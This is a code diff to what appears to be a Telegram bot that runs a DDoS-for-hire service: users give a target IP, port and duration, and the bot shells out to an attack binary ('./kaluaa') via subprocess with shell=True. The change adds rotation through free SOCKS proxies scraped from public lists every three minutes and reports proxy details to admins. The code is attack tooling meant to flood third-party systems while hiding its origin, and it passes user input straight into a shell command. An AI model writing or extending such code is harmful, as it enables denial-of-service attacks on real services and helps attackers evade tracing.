@@ -417,7 +417,7 @@ import requests
 import threading
 import time
 
-# Add these at the top of your code with other imports
+# Add these at the top of your code
 PROXY_LIST = []
 PROXY_SOURCES = [
     'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
@@ -442,7 +442,7 @@ def update_proxy_list():
         
         if temp_proxies:
             PROXY_LIST = list(temp_proxies)
-        time.sleep(1800)  # Update every 30 minutes
+        time.sleep(180)  # Update every 3 minutes
 
 def get_random_proxy():
     if not PROXY_LIST:
@@ -457,18 +457,16 @@ def start_attack_reply(message, target, port, time):
         username = message.from_user.username if message.from_user.username else message.from_user.first_name
         user_id = message.from_user.id
         start_time = datetime.now(IST)
-    
-    # Add attack to ongoing attacks list
-    ongoing_attacks.append({
-        'user': username,
-        'user_id': user_id,
-        'target': target,
-        'port': port,
-        'time': time,
-        'start_time': start_time
-    })
-    
-    # Regular user notification (without proxy details)
+
+        ongoing_attacks.append({
+            'user': username,
+            'user_id': user_id,
+            'target': target,
+            'port': port,
+            'time': time,
+            'start_time': start_time
+        })
+
         user_response = f"""
 🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!
 ━━━━━━━━━━━━━━━
@@ -480,8 +478,7 @@ def start_attack_reply(message, target, port, time):
 📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%H:%M:%S')} IST
 """
         bot.reply_to(message, user_response)
-    
-        # Admin notification with proxy details
+
         admin_notification = f"""
 🚨 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗
 ━━━━━━━━━━━━━━━
@@ -494,31 +491,24 @@ def start_attack_reply(message, target, port, time):
 """
         for admin in admin_id:
             bot.send_message(admin, admin_notification)
-    
-    try:
-        # Execute attack
-        subprocess.run(f"./kaluaa {target} {port} {time}", shell=True)
-        
-        # Calculate attack duration
+
+        # Execute attack with proxy
+        attack_command = f"./kaluaa {target} {port} {time} --proxy {proxy}"
+        subprocess.run(attack_command, shell=True)
+
         end_time = datetime.now(IST)
         duration = (end_time - start_time).total_seconds()
-        
-        # Remove from ongoing attacks
         ongoing_attacks.pop()
-        
-        # Send completion message to user
+
         completion_msg = f"""
 ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
-
 ⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
 📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%H:%M:%S')} IST
 """
         bot.reply_to(message, completion_msg)
-        
-        # Send completion notification to admin
+
         admin_completion = f"""
 ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
-
 👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
@@ -528,27 +518,24 @@ def start_attack_reply(message, target, port, time):
 """
         for admin in admin_id:
             bot.send_message(admin, admin_completion)
-        
+
     except Exception as e:
-        # Handle attack failure
         ongoing_attacks.pop()
         error_msg = f"""
 ❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗
-
 ⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
 📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿.
 """
         bot.reply_to(message, error_msg)
-        
-        # Send failure notification to admin
+
         admin_failure = f"""
 ❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗
-
 👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
 🔌 𝗣𝗼𝗿𝘁: {port}
 ⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
 📅 𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
+🌐 𝗣𝗿𝗼𝘅𝘆: {proxy}
 """
         for admin in admin_id:
             bot.send_message(admin, admin_failure)
